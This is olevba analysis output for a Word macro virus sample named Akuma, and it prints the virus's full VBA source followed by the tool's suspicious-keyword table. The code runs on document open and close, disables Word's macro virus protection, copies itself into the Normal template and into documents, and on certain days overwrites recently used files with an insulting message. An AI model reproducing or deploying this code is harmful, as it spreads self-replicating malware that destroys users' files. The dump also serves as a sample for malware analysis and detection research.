olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Akuma-2e11dc4f73787dd7478de9165cb3d24c189bad3b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Akuma-2e11dc4f73787dd7478de9165cb3d24c189bad3b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Akuma
    On Error Resume Next
    stato = ActiveDocument.Saved
    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    Application.DisplayRecentFiles = True
    RecentFiles.Maximum = 9
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    db = AkumaClear(bry, "Private Sub Document_Close()")
    db = AkumaClear(bry, "Private Sub Document_Open()")
    db = AkumaClear(bry, "Private Function AkumaFind(DoveM, StartM)")
    db = AkumaClear(bry, "Private Function AkumaClear(DoveM, StartM)")
    db = AkumaClear(bry, "Private Function AkumaWrite(StartM)")
    db = AkumaClear(bry, "Private Function AkumaInfect()")
    db = AkumaClear(bry, "Sub Document_Close()")
    db = AkumaClear(bry, "Sub Document_Open()")
    Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
    db = AkumaClear(bry, "Private Sub Document_Close()")
    db = AkumaClear(bry, "Private Sub Document_Open()")
    db = AkumaClear(bry, "Private Function AkumaFind(DoveM, StartM)")
    db = AkumaClear(bry, "Private Function AkumaClear(DoveM, StartM)")
    db = AkumaClear(bry, "Private Function AkumaWrite(StartM)")
    db = AkumaClear(bry, "Private Function AkumaInfect()")
    db = AkumaClear(bry, "Sub Document_Close()")
    db = AkumaClear(bry, "Sub Document_Open()")
    SetAttr "c:\cont.dbl", vbNormal
    Kill "c:\cont.dbl"
    Open "c:\cont.dbl" For Output As #1
    db = AkumaWrite("Private Sub Document_Open()")
    db = AkumaWrite("Private Sub Document_Close()")
    db = AkumaWrite("Private Function AkumaFind(DoveM, StartM)")
    db = AkumaWrite("Private Function AkumaClear(DoveM, StartM)")
    db = AkumaWrite("Private Function AkumaWrite(StartM)")
    db = AkumaWrite("Private Function AkumaInfect()")
    Close #1
    SetAttr "c:\cont.dbl", vbNormal
    AkumaInfect
    Kill "c:\cont.dbl"
    Randomize
    If Int((6 * Rnd) + 1) < 3 Then
        With Dialogs(wdDialogFileSummaryInfo)
            .Title = "Akuma Macro Carrier"
            .Author = "Akuma"
            .Keywords = "Mary Bitch"
            .Execute
        End With
    End If
    If Left(ActiveDocument.Name, 8) <> "Document" Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
    ActiveDocument.Saved = stato
    On Error GoTo 0
End Sub

Private Sub Document_Close()
'Akuma
    On Error Resume Next
    If Day(Date) >= 16 And Day(Date) <= 18 Then
        If Dir("c:\mary.log", vbArchive + vbHidden + vbReadOnly) = "" Then
            For c = 1 To Application.RecentFiles.Count
                If Left(Application.RecentFiles.Item(c).Path, 3) <> "A:\" Then
                    Open Application.RecentFiles.Item(c).Path + "\" + Application.RecentFiles.Item(c) For Output As #1
                    Print #1, "Something wonderful has happened, your PC is alive and even better but some of your documents are infected by the Akuma virus." + Chr$(10) + "Mary is simply a bitch and you, " + Application.UserName + ", are a stupid jerk and lose some files." + Chr$(10) + "Have a nice day."
                    Close #1
                End If
            Next c
        Else
            MsgBox "Something wonderful has happened, your PC is alive and even better but some of your documents are infected by the Akuma virus." + Chr$(10) + "Mary is simply a bitch and you, " + Application.UserName + ", are a stupid jerk and lose some files." + Chr$(10) + "Have a nice day."
        End If
    End If
End Sub

Private Function AkumaFind(DoveM, StartM)
'Akuma
    flagaltro = False
    flagio = False
    For Count = 1 To DoveM.CodeModule.CountOfLines
        If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then
            flagaltro = True
            flagio = False
            If Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Akuma" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next Count
    If flagaltro = True Then
        For Count = 1 To DoveM.CodeModule.CountOfLines
            If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then Exit For
        Next Count
        AkumaFind = Count
    Else
        If flagio = False Then
            AkumaFind = "Akuma"
        End If
        If flagio = True Then
            AkumaFind = "Akuma Yes" + Str(Count)
        End If
    End If
End Function

Private Function AkumaClear(DoveM, StartM)
'Akuma
    Count = AkumaFind(DoveM, StartM)
    If Count <> "Akuma" And Count <> "Akuma Yes" Then
        Do Until DoveM.CodeModule.Lines(Count, 1) = "End Sub" Or DoveM.CodeModule.Lines(Count, 1) = "End Function"
            DoveM.CodeModule.DeleteLines (Count)
        Loop
        DoveM.CodeModule.DeleteLines (Count)
    End If
End Function

Private Function AkumaWrite(StartM)
'Akuma
    Count = AkumaFind(MacroContainer.VBProject.VBComponents.Item(1), StartM)
    If Count <> "Akuma" Then
        If Left(Count, Len("Akuma Yes")) = "Akuma Yes" Then
            Count = Val(Right(Count, Len(Count) - Len("Akuma Yes")))
        End If
        Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Sub" Or MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Function"
            stress = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
            Print #1, stress
            Count = Count + 1
        Loop
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
        Print #1, ""
    End If
End Function

Private Function AkumaInfect()
'Akuma
    If AkumaFind(NormalTemplate.VBProject.VBComponents.Item(1), "Private Sub Document_Open()") = "Akuma" Then
        Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
        flag = True
    ElseIf AkumaFind(ActiveDocument.VBProject.VBComponents.Item(1), "Private Sub Document_Open()") = "Akuma" Then
        Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
        flag = True
    Else
        flag = False
    End If
    If flag = True Then
        Open "c:\cont.dbl" For Input As #2
        If LOF(2) = 0 Then GoTo cpyvir
        Count = 1
        Do While Not EOF(2)
            Line Input #2, stress
            bry.CodeModule.InsertLines Count, stress
            Count = Count + 1
        Loop
cpyvir: Close #2
    End If
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

